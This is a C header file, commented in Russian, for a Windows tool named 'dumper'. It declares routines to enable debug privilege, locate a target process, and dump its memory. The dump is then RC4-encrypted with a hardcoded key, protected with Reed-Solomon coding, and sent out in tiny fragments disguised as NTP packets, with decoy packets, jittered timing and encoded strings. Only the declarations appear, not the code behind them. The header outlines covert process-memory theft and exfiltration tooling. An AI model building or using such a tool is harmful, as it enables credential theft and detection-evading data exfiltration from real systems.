#ifndef DUMPER_H
#define DUMPER_H

#define UNICODE
#define _UNICODE

#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <ws2tcpip.h>
#include <time.h>

// Линкуем необходимые библиотеки
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "DbgHelp.lib")

// ------------------
// Константы / настройки
// ------------------
#define FRAGMENT_SIZE 2              // Число полезных байт на фрагмент
#define RC4_KEY "MySecretKey"        // Ключ для RC4
#define BLOCK_SIZE 10                // Размер блока (число фрагментов данных на блок) для FEC
#define MAX_RETRANS 5                // Макс. число циклов ретрансляции
#define BASE_DELAY_MIN 50            // Миним. задержка (мс) между отправкой фрагментов
#define BASE_DELAY_MAX 150           // Макс. задержка (мс) между отправкой фрагментов
#define FEEDBACK_TIMEOUT 3000        // Таймаут (мс) на приём feedback (3 сек)
#define SOCKET_RCVBUF_SIZE (1<<20)   // 1 МБ буфера сокета

// ------------------
// Глобальные таблицы для GF(256) / Reed-Solomon
// ------------------
extern unsigned char gf_exp[512];
extern unsigned char gf_log[256];

// Инициализация таблиц GF(256)
void init_gf(void);

// Умножение в поле GF(256)
unsigned char gf_mul(unsigned char a, unsigned char b);

// Код RS (Вандермонде)
void rs_encode_block(const unsigned char *data, int k, unsigned char *parity, int m);

// ------------------
// RC4
// ------------------
void rc4_init(unsigned char *S, const unsigned char *key, int keylen);
void rc4_crypt(unsigned char *S, const unsigned char *in, unsigned char *out, int len);

// ------------------
// Привилегии / дамп памяти
// ------------------
BOOL EnableDebugPrivilege(void);
DWORD GetTargetProcessPID(const wchar_t *targetProcessName);
BOOL DumpProcessToMemory(DWORD pid, char **dumpBuffer, size_t *dumpSize);

// ------------------
// Утилиты
// ------------------
wchar_t* ConvertToWideChar(const char* charStr);
void DecodeString(const wchar_t *encoded, int key, wchar_t *decoded, size_t maxLen);

// ------------------
// UDP / NTP-пакеты
// ------------------
void CreateNTPPacket(const unsigned char payload[8], unsigned char packet[48]);
int SendNTPPacket(const char *target_ip, int target_port, const unsigned char payload[8]);
int SendDecoyNTPPacket(const char *target_ip, int target_port);

// ------------------
// Отправка дампа (без сжатия!) с FEC и RC4
// ------------------
int SendDumpAsNTP(const char *target_ip, int target_port, const char *dumpData, size_t dumpSize);

// ------------------
// Ретрансляция недостающих фрагментов
// ------------------
void ProcessRetransmissions(const char *target_ip, int target_port, const char *dumpData, size_t dumpSize, int total_fragments);

#endif // DUMPER_H
